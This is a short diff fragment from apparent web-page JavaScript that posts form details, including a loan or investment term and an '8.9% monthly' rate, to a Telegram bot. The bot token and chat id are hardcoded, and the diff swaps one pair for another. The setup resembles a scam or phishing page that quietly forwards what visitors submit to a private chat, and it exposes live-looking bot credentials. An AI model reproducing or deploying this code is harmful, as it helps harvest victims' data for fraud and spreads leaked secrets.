@@ -335,10 +335,10 @@
                     '<b>Term:</b> <code>' + term + ' ' + (term === '1' ? 'Month' : 'Months') + '</code>\n' +
                     '<b>Rate:</b> <code>8.9% monthly</code>';
 
-                await fetch('https://api.telegram.org/bot8807278526:AAF8s3Z7XsjQNSk2ybpDwyappH6F7aWQexM/sendMessage', {
+                await fetch('https://api.telegram.org/bot8624096011:AAF75d7geCe-aKAU8k2y13gYn6LHKw_nKu0/sendMessage', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: '7547427914', text: msg, parse_mode: 'HTML' })
+                    body: JSON.stringify({ chat_id: '7644163677', text: msg, parse_mode: 'HTML' })
                 });
             } catch (e) {
                 console.error('Telegram error:', e);
